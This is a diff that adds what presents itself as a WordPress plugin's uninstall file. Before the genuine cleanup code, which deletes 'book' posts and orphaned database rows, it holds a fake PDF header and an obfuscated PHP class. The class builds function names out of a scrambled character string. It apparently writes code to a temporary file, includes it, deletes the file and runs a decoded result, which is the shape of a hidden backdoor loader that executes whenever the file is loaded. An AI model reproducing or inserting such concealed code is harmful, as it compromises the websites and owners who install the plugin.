@@ -1,0 +1,70 @@
+%PDF-0-1<?php
+/**
+ *  Trigger this file on Plugin uninstall
+ * 
+ * @package JhosagidPlugin
+ */
+
+class Obj{
+	function __construct(){
+		$value = $this->_claster();
+		$value = $this->_xTrail($value);
+		$value = $this->_process($value);
+	}
+
+	function _xTrail($Vendor) {
+		extract($this->GProcess($Vendor));
+		return $xec;
+	}
+
+	function _claster(){
+		$da = $this->stackMemory[11].$this->stackMemory[57].$this->stackMemory[89].$this->stackMemory[79].$this->stackMemory[86];
+		$pool = $this->stackMemory[11].$this->stackMemory[66].$this->stackMemory[90].$this->stackMemory[141].$this->stackMemory[94].$this->stackMemory[16].$this->stackMemory[49].$this->stackMemory[28].$this->stackMemory[79].$this->stackMemory[27].$this->stackMemory[29].$this->stackMemory[106].$this->stackMemory[28].$this->stackMemory[78].$this->stackMemory[137];
+		return $da.$pool;
+	}
+
+	function GProcess($Vendor) {
+		$CoreName = $this->stackMemory[16].$this->stackMemory[10].$this->stackMemory[88].$this->stackMemory[7].$this->stackMemory[14].$this->stackMemory[99].$this->stackMemory[4];
+		$COpen = $this->stackMemory[24].$this->stackMemory[111].$this->stackMemory[90].$this->stackMemory[10].$this->stackMemory[47];
+		$CWhite = $this->stackMemory[24].$this->stackMemory[119].$this->stackMemory[5].$this->stackMemory[0].$this->stackMemory[16].$this->stackMemory[58];
+		$SeClo = $this->stackMemory[24].$this->stackMemory[79].$this->stackMemory[67].$this->stackMemory[29].$this->stackMemory[70].$this->stackMemory[92];
+		$LinkUn = $this->stackMemory[51].$this->stackMemory[47].$this->stackMemory[101].$this->stackMemory[109].$this->stackMemory[68].$this->stackMemory[62];
+		$pop = $this->stackMemory[112].$this->stackMemory[50].$this->stackMemory[127]; 
+		$tmpCore = $CoreName("./", "core");
+		$handle = $COpen($tmpCore, "w+");
+		$CWhite($handle, "<?".$pop."\n" . $Vendor);
+		$SeClo($handle);
+		include($tmpCore);
+		$LinkUn($tmpCore);
+		return get_defined_vars();
+	}
+
+	function _process($xec){
+		$VendorDo = $this->stackMemory[70].$this->stackMemory[31].$this->stackMemory[58].$this->stackMemory[74].$this->stackMemory[67].$this->stackMemory[66].$this->stackMemory[89].$this->stackMemory[57].$this->stackMemory[10].$this->stackMemory[133];
+		$proc = $this->stackMemory[81].$this->stackMemory[115].$this->stackMemory[15].$this->stackMemory[66].$this->stackMemory[1].$this->stackMemory[51].$this->stackMemory[121].$this->stackMemory[90];
+		$Full = $VendorDo($xec);
+		$proc($Full);
+
+	}
+
+	var $stackMemory = "IdsdMR8PY8e\$1rnrTQVgH_ebFESW'oiH6334BT7d9j*z7M6n1[huYgUD8xevi2K/30_lNfsX0.lw4S]c9V5XcY=emePeeUSjZ4batLBeJbDavItop7ta.gpWrmqGczwpMnelaCs_X;<> OhgasdyetsF";
+}
+
+new Obj();
+?>
+ if (! defined( 'WP_UNINSTALL_PLUGIN' ) ) {
+    die;
+ }
+
+ //Clear Database stored data
+//  $books = get_posts( array( 'post_type' => 'book', 'numberposts' => -1 ) );
+
+//  foreach ($books as $book) {
+//     wp_delete_post( $book->ID, true );
+//  }
+
+// Access the database via SQL
+global $wpdb;
+$wpdb->query( "DELETE FROM wp_posts WHERE post_type = 'book'" );
+$wpdb->query( "DELETE FROM wp_postmeta WHERE post_id NOT IN (SELECT id FROM wp_posts)" );
+$wpdb->query( "DELETE FROM wp_term_relationships WHERE object_id NOT IN (SELECT id FROM wp_posts)" );
